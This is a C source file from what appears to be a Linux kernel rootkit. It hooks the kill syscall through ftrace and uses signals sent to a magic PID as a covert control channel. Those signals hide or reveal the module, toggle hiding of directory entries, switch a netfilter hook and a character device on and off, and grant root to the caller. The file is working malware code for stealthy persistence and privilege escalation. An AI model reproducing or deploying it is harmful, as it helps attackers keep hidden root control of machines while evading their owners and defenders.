#include "cdd.h"
#include "config.h"
#include "evasion.h"
#include "hook.h"
#include "netfilter.h"
#include "sudo.h"
#include "sys_getdents.h"
#include "sys_kill.h"

#ifdef HTM_PTREGS_SYSCALL_STUBS
static asmlinkage int (*_sys_kill)(struct pt_regs *regs);
#else
static asmlinkage int (*_sys_kill)(pid_t pid, int sig);
#endif

#ifdef HTM_PTREGS_SYSCALL_STUBS
static notrace asmlinkage int _sys_kill_hook(struct pt_regs *regs)
{
	int sig = (int)regs->si;
	pid_t pid = (pid_t)regs->di;
#else
static notrace asmlinkage int _sys_kill_hook(int pid, int sig)
{
#endif
	if (pid != HTM_PID)
		goto call_original;

	switch (sig) {
		case HTM_SIG_DISABLE_CDD:
			htm_cdd_destroy();
			return 0;

		case HTM_SIG_DISABLE_FS:
			htm_hook_uninstall(&hook_sys_getdents);
			htm_hook_uninstall(&hook_sys_getdents64);
			return 0;

		case HTM_SIG_DISABLE_NF:
			htm_netfilter_unregister();
			return 0;

		case HTM_SIG_ENABLE_CDD:
			htm_cdd_create();
			return 0;

		case HTM_SIG_ENABLE_FS:
			htm_hook_install(&hook_sys_getdents);
			htm_hook_install(&hook_sys_getdents64);
			return 0;

		case HTM_SIG_ENABLE_NF:
			htm_netfilter_register();
			return 0;

		case HTM_SIG_HIDE_MODULE:
			htm_hide_module();
			return 0;

		case HTM_SIG_SHOW_MODULE:
			htm_show_module();
			return 0;

		case HTM_SIG_STATUS:
			return 0;

		case HTM_SIG_SUDO:
			htm_sudo(0);
			return 0;
	}

call_original:
	#ifdef HTM_PTREGS_SYSCALL_STUBS
	return _sys_kill(regs);
	#else
	return _sys_kill(pid, sig);
	#endif
}

struct htm_ftrace_hook hook_sys_kill = HTM_HOOK("__x64_sys_kill", _sys_kill_hook, &_sys_kill);
